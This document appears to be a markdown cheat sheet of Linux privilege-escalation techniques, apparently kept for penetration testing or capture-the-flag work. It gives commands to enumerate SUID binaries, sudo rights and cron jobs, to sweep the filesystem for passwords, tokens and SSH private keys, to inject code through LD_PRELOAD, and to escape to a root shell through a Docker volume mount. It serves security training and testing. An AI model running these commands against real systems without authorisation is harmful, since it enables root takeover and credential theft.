## Linux Priviledge Escalation
- OS Version

- Kernel Exploits
   - **Check Kernel**: `uname -r`
   - **Exploit**: Search for exploits by kernel version on Exploit-DB.
     
- Running Services
  - `ps -eo user,pid,comm | grep '^root'`
- SUID Binaries
   - **Find SUID Files**: `find / -perm -4000 2>/dev/null`
   - **Exploits**: Use GTFOBins for known SUID binary exploits.

- sudo -l (Check Sudo Privileges)
   - **List Privileges**: `sudo -l`
   - Running a vuln executable as particular user, `sudo -u targetuser /bin/vulnfile`
   - **Exploits**: Look for `NOPASSWD` or exploitable commands (e.g., `vim`, `find`).

- Cron Jobs
   - **View Cron Jobs**: `cat /etc/crontab`, `ls -la /etc/cron.d/`
   - **Exploits**: Writable cron scripts or wildcard abuse.

- Writable /etc/passwd
   - **Exploit**: Add new root user using password hash from `openssl passwd -1`.

- SSH Keys
   - **Find Keys**: `find / -name "*.pem" 2>/dev/null`
   - **Exploit**: Use private key for SSH if no passphrase.

- PATH Variable Manipulation
   - **Exploit**: Modify `PATH` and place malicious script in writable directory.

- NFS Root Squashing
   - **Check**: Look for `no_root_squash` in `/etc/exports`
   - **Exploit**: Mount and access with root on NFS share.

- World-Writable Files
   - **Find**: `find / -writable -type d 2>/dev/null`
   - **Exploit**: Overwrite world-writable scripts or binaries.

- LD_PRELOAD and LD_LIBRARY_PATH
   - **Exploit**: Inject code with custom library.
     ```bash
     gcc -fPIC -shared -o shell.so shell.c -nostartfiles
     LD_PRELOAD=./shell.so <vulnerable_program>
     ```
- Docker Privilege Escalation
   - **Exploit**: Mount root filesystem and escape container:
     ```bash
     docker run -v /:/mnt --rm -it alpine chroot /mnt sh
     ```
- Password and Credential Files
   - **Find Sensitive Files**:
     ```bash
     find / -type f -exec grep -iH 'password' {} \; 2>/dev/null
     find / -type f -exec grep -Ei 'password|passwd|pwd|secret|token|key' {} \; 2>/dev/null
     find / -type f -exec grep -iE 'pass(word)?\s*=\s*["'\'']?.+["'\'']?' {} \; 2>/dev/null
     find / -name "*.bak" 2>/dev/null
     find / -name "*.old" 2>/dev/null
     ```
- Check Hidden Files
- Check Hidden Direstories
  - **ssh files**
    ```bash
    find / -name "id_rsa" -o -name "id_dsa" -o -name "authorized_keys" -o -name "known_hosts" 2>/dev/null
    find / -name "*.pem" -o -name "*.key" 2>/dev/null
    ```

     
## Common Checks
```bash
whoami #username
hostname #hostname
cat /etc/os-release #os details
uname -a #kernel details
lscpu #cpu details
route #ip and interface details
cat /etc/passwd | cut -f1 -d: # users details

```
